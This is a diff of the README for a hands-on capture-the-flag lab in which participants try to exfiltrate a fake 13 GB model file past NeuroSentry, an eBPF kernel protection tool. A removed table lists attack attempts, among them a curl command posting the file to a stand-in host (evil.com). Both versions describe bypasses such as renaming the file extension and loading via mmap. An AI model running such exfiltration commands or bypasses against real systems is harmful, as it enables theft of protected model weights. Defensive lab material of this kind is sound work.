@@ -1,10 +1,16 @@
-# Capture The Model
-
-**Interactive Demo Environment**
+# Capture The Model — hands-on lab challenge
 
 ## Overview
 
-Capture The Model is a hands-on demo environment that demonstrates NeuroSentry's protection capabilities. Participants attempt to exfiltrate a "protected" AI model from a containerized inference environment while NeuroSentry actively monitors and blocks unauthorized access.
+Capture The Model is a 15-minute hands-on challenge: try to exfiltrate a 13 GB
+"protected" AI model file from a containerized inference environment while
+NeuroSentry runs live on the host kernel.
+
+The headline change for this revision: **LSM enforcement now performs true
+kernel-level blocking.** Open syscalls against protected file extensions return
+`-EPERM` from the `security_file_open` LSM hook before any byte is read. There
+is no user-space interception path — `glibc`, Python, Go, and `dd` all see the
+same hard error.
 
 ## Challenge Setup
 
@@ -16,208 +22,190 @@ sudo ./start.sh
 ```
 
 This will:
-1. Build the NeuroSentry Docker image
-2. Generate a fake 13GB model file
-3. Start all services (NeuroSentry, attacker container, scoring server)
+1. Build the `neurosentry:ctf-latest` Docker image (if missing)
+2. Generate a fake 13 GB model file at `model-data/llama-2-7b.safetensors`
+3. Start all services via `docker-compose up -d`
 4. Print access instructions
 
-The challenge includes:
-- **NeuroSentry** container (protected mode)
-- **Attacker** container (your workspace)
-- **Scoring server** (tracks attempts and verifies success)
-- **Prometheus** (metrics)
-- **Grafana** (dashboard at http://localhost:3000)
+The challenge brings up:
+- **neurosentry** container (privileged, `--pid=host`, `--network=host`, enforce mode)
+- **attacker** container (Alpine 3.19, your workspace, `/target` is read-only mount)
+- **scoring** server (Python HTTP, tracks attempts and verifies MD5 on success)
+- **prometheus** (metrics scrape on `:2112`)
+- **grafana** (dashboard at <http://localhost:3000>, login `admin` / `neurosentry`)
 
-### Manual Setup
-
-```bash
-# 1. Create protected model
-mkdir -p /opt/capture-the-model/model
-dd if=/dev/urandom of=/opt/capture-the-model/model/llama-2-7b.safetensors bs=1M count=13312
-
-# 2. Deploy NeuroSentry
-docker run -d --name neurosentry \
-  --privileged --pid=host --network=host \
-  -v /sys/kernel/debug:/sys/kernel/debug \
-  -v /opt/capture-the-model/model:/models \
-  neurosentry:latest
-
-# 3. Create attacker container
-docker run -d --name attacker \
-  --privileged --network=host \
-  -v /opt/capture-the-model/model:/target:ro \
-  alpine:3.19 sleep infinity
-```
-
-## Challenge Details
-
-### Objective
-
-Copy the protected model file (`/target/model.safetensors`) to `/tmp/stolen/` and verify integrity.
-
-### Constraints
-
-- **Time Limit**: 15 minutes
-- **Environment**: Isolated Linux container
-- **Protection**: NeuroSentry in enforce mode
-- **File Size**: 13GB
-
-### What Participants Should Know
-
-NeuroSentry is protecting the model with:
-1. **LSM Hooks**: Block file operations at VFS layer (ENFORCE MODE)
-2. **XDP/TC Programs**: Monitor network traffic (MONITOR MODE - logs but doesn't block)
-3. **Uprobes**: Monitor PyTorch model loading
-
-### Protection Levels
-
-```
-Layer 1: File Access Control (LSM file_open) - ENFORCED
-         Blocks read access to protected file extensions (.safetensors, .gguf, .pth, etc.)
-         Returns -EPERM to untrusted processes
-
-Layer 2: Network Monitoring (XDP/TC) - MONITORED ONLY
-         Logs all egress traffic but does not block
-         (Blocking disabled to prevent breaking legitimate network operations)
-
-Layer 3: Process Monitoring (Trusted PID tracking)
-         Only whitelisted PIDs can access protected files
-```
-
-**Note**: Network blocking is intentionally disabled because aggressive network filtering
-can break legitimate operations and cause connectivity issues. In production, use
-network segmentation and firewalls for network-level protection.
-
-## Expected Participant Attempts
-
-### Common Techniques
-
-| Attempt | Expected Result | Explanation |
-|---------|-----------------|-------------|
-| `cp /target/model.safetensors /tmp/` | **EPERM** | LSM file_open blocks .safetensors files |
-| `cat /target/model.safetensors > /tmp/` | **EPERM** | LSM file_open blocks .safetensors files |
-| `dd if=/target/model...` | **EPERM** | LSM file_open blocks .safetensors files |
-| `python3 -c "open('/target/model.safetensors')"` | **EPERM** | LSM blocks all untrusted processes |
-| `kill -9 $(pidof neurosentry)` | Auto-restart | Systemd monitoring |
-| `docker rm -f neurosentry` | Auto-restart | Systemd monitoring |
-| `curl http://evil.com --data-binary @file` | **Monitored** | Network traffic is logged, not blocked |
-| Send via UDP | **Monitored** | Network traffic is logged, not blocked |
-
-**Important**: Network exfiltration is MONITORED but NOT BLOCKED. In a real deployment,
-combine NeuroSentry with network-level controls (firewalls, segmentation) for full protection.
-
-### Advanced Techniques (Challenge Difficulty)
-
-| Attempt | Expected Result | Notes |
-|---------|-----------------|-------|
-| Kernel exploit | Success/Fail | Depends on kernel version, very difficult |
-| Container escape | Success/Fail | Depends on container config |
-| BPF map tampering | Audited | All map changes are logged with security audit |
-| Add own PID to trusted list | Audited | Requires root, logged with "SECURITY:" prefix |
-| Rename file extension | Success | Files are checked by extension only |
-| Symlink to bypass | Blocked | LSM hook checks final path |
-
-### Known Limitations (For Educational Discussion)
-
-- **Extension-based detection**: Files are protected by extension (.safetensors, .gguf, etc.)
-  Renaming the file removes protection (real deployments use content-based detection)
-- **PID-based trust**: If attacker can modify trusted_pids map, protection is bypassed
-  (requires CAP_BPF or root access)
-- **Network is monitor-only**: Exfiltration via network will be logged but not blocked
-
-## Scoring System
-
-The challenge includes an automated scoring system that tracks:
-- Number of attempts per participant
-- Methods used (copy, network, memory dump, etc.)
-- Time elapsed
-- Success verification (MD5 hash matching)
-
-### Scoring API
+### Entering the Workspace
 
 ```bash
-# Get current status
+docker exec -it attacker sh
+cat /workspace/mission.txt
+```
+
+The protected file is bind-mounted read-only at:
+
+```
+/target/llama-2-7b.safetensors
+```
+
+## What Is Actually Enforced
+
+NeuroSentry attaches four eBPF program types. Their behavior in this demo
+matches `config/neurosentry.yaml`:
+
+| Layer | Hook | Mode in this demo | Effect |
+|-------|------|-------------------|--------|
+| LSM | `lsm/file_open` | **ENFORCE** | Returns `-EPERM` for protected extensions opened by untrusted PIDs |
+| TC  | `tc/clsact` ingress + egress | Monitor-only | Logs egress flows; does not drop |
+| XDP | `xdp/generic` | Monitor-only | Per-packet stats only |
+| Uprobe | libpython `_pickle` | Observe-only | Emits an event on pickle module activity; symbol-aware matching is roadmap (see Known Limitations) |
+| Uprobe | libtorch | Observe-only | Emits an event on `torch::load()` |
+
+> **What is NOT enforced in v1.0:** `lsm/file_permission` and `lsm/mmap_file`
+> hooks are present in source but not currently attached (verifier work in
+> progress); a process that already holds an open fd, or that loads via
+> `mmap`, is not blocked by the LSM layer in v1.0.
+
+Protected extensions (from `config/neurosentry.yaml`):
+`.safetensors`, `.gguf`, `.pth`, `.pt`, `.onnx`, `.h5`
+
+> `.pkl` and `.bin` are **not** in the LSM extension list. `.pkl` is intended
+> to be covered by the pickle uprobes; `.bin` is intentionally omitted to
+> avoid false positives on common binary files (firmware images, container
+> blobs, etc.).
+
+Protected paths: `/models`, `/target`
+
+> **Why is the network layer monitor-only?** Aggressive XDP/TC drops on a host
+> sharing its network namespace with the demo containers (`network_mode: host`)
+> would knock out the scoring server, Grafana, and the host's own connectivity.
+> In production, pair NeuroSentry with a real network policy (Cilium, AWS SG,
+> nftables). The LSM enforcement layer is independent and remains hard.
+
+## Expected First Contact
+
+The first thing every participant tries:
+
+```sh
+/ # cp /target/llama-2-7b.safetensors /tmp/
+cp: can't open '/target/llama-2-7b.safetensors': Operation not permitted
+```
+
+Same for every other read path:
+
+```sh
+/ # cat /target/llama-2-7b.safetensors > /tmp/out
+cat: can't open '/target/llama-2-7b.safetensors': Operation not permitted
+
+/ # dd if=/target/llama-2-7b.safetensors of=/tmp/out bs=1M
+dd: can't open '/target/llama-2-7b.safetensors': Operation not permitted
+
+/ # python3 -c "open('/target/llama-2-7b.safetensors','rb').read(1)"
+PermissionError: [Errno 1] Operation not permitted: '/target/llama-2-7b.safetensors'
+```
+
+In all four cases the `-EPERM` is returned from the kernel by the LSM hook
+before `read(2)` is ever issued. You can confirm the block in real time:
+
+```sh
+docker logs --tail 20 neurosentry | grep file_blocked
+# {"event":"file_blocked","pid":1234,"comm":"cp","filename":"llama-2-7b.safetensors","action":"EPERM"}
+```
+
+See `challenge.md` for the full three-tier attack progression.
+
+## Scoring Server
+
+The scoring server listens on `:8080` (the container uses `network_mode: host`,
+so it's on the host loopback).
+
+```bash
+# Status / countdown
 curl http://localhost:8080/status
 
-# Submit an attempt
+# Submit an attempt (record what you tried, success=false is fine)
 curl -X POST http://localhost:8080/submit \
-  -H "Content-Type: application/json" \
-  -d '{"method": "cp", "success": false, "details": "EPERM"}'
+  -H 'Content-Type: application/json' \
+  -d '{"method":"cp","success":false,"details":"EPERM from LSM"}'
 
-# Verify exfiltration
+# Verify exfiltration (MD5 check against the original)
 curl -X POST http://localhost:8080/verify \
-  -H "Content-Type: application/json" \
-  -d '{"file_path": "/tmp/stolen/model.safetensors"}'
+  -H 'Content-Type: application/json' \
+  -d '{"file_path":"/tmp/stolen/llama-2-7b.safetensors"}'
 
-# View leaderboard
+# Leaderboard
 curl http://localhost:8080/leaderboard
 
-# View all attempts
+# All recorded attempts
 curl http://localhost:8080/attempts
 ```
 
-### Achievement Categories
+## Prize Tiers
 
-Participants can earn different achievements based on their performance:
-
-| Achievement | Criteria |
-|-------------|----------|
-| **Attacker** | Successfully exfiltrate the model |
-| **Explorer** | 10+ creative attempts documented |
-| **Researcher** | Find a novel bypass technique |
-| **Auditor** | Find a critical security bug (CVE candidate) |
+| Hat | Criteria |
+|-----|----------|
+| Black Hat | Successfully exfiltrate the file (MD5 match at scoring server) |
+| White Hat | 10+ documented creative attempts |
+| Grey Hat  | Find a novel bypass we did not anticipate |
+| Red Hat   | Find a real security bug in NeuroSentry — credit in `SECURITY.md` |
 
 ## Organizer Notes
 
 ### Pre-Flight Checklist
 
-- [ ] Isolated test machine (no production access)
-- [ ] Model file is random data (no real IP)
-- [ ] Network containment verified
-- [ ] Rollback plan ready
-- [ ] Emergency stop procedure tested
+- [ ] Isolated host (no production access, no real model IP on disk)
+- [ ] `uname -r` shows kernel 5.10+ with `CONFIG_BPF_LSM=y` (`grep BPF_LSM /boot/config-$(uname -r)`)
+- [ ] At least 30 GB free disk for the 13 GB model + Docker overhead
+- [ ] `docker compose` available (or `docker-compose` v1.29+)
+- [ ] Rollback / emergency-stop procedure tested (see below)
 
 ### Emergency Stop
 
 ```bash
-# Stop everything immediately
-docker stop attacker neurosentry
-rmmod bpf_test_mod  # If loaded
-rm -rf /opt/capture-the-model
+# Tear everything down
+cd demos/capture-the-model
+sudo ./stop.sh
+
+# If stop.sh is unavailable
+docker compose down -v
 ```
 
 ### Troubleshooting
 
-**Issue**: Participants can't even see the file
-**Fix**: Check bind mount permissions
+**Issue:** All open attempts succeed (no `EPERM`).
+**Check:** `docker logs neurosentry | grep -i 'lsm'`. Confirm `lsm/file_open`
+attached. If `bpf_lsm` shows as unavailable, the kernel was built without
+`CONFIG_BPF_LSM=y` or `lsm=` was not enabled on the cmdline.
 
-**Issue**: NeuroSentry crashes
-**Fix**: Check kernel logs: `dmesg | tail -50`
+**Issue:** Scoring server returns 404.
+**Check:** `docker compose ps scoring`; verify `network_mode: host` and that
+nothing else is bound to `:8080`.
 
-**Issue**: Network not blocking
-**Fix**: Verify XDP attachment: `bpftool net`
+**Issue:** Grafana shows no data.
+**Check:** Prometheus target list at <http://localhost:9090/targets> — the
+`neurosentry:2112` scrape should be UP.
 
 ## Post-Challenge
 
-### Data Collection
+- All blocked-access events are in `logs/` (mounted from
+  `./logs:/var/log/neurosentry`)
+- Metrics: `curl -s http://localhost:2112/metrics | grep neurosentry_`
+- Encourage participants to leave a note in `/workspace/` with what they tried
 
-- All attempts logged to `/var/log/neurosentry/attempts.log`
-- Metrics available at `http://localhost:2112/metrics`
-- Screen recordings encouraged
+### Debrief talking points
 
-### Debrief
-
-After the challenge, explain:
-1. Which techniques were expected to fail (and why)
-2. Which techniques succeeded (if any)
-3. How NeuroSentry works under the hood
-4. Real-world deployment considerations
+1. Why LSM `file_open` returning `-EPERM` cannot be defeated from user space
+   (no `LD_PRELOAD`, no syscall hook, no Python-level workaround).
+2. The honest gap: extension-based detection. Renaming bypasses the policy.
+   Real deployments need content-based detection (magic bytes, header parse).
+3. What `bpftool prog show` and `bpftool map dump` look like during an active
+   attempt; why root can read maps but every map mutation is audited.
+4. Where the demo intentionally cuts corners (network monitor-only) and why.
 
 ## Contact
 
-- **Issues**: https://github.com/tonghuaroot/neurosentry/issues
-- **Discussions**: https://github.com/tonghuaroot/neurosentry/discussions
+- **Issues / Discussions**: <https://github.com/tonghuaroot/neurosentry>
+- **Security reports**: see [SECURITY.md](../../SECURITY.md)
 
 ## License
 
-This challenge is part of NeuroSentry, Apache 2.0 licensed.
+Apache 2.0. See repository root.
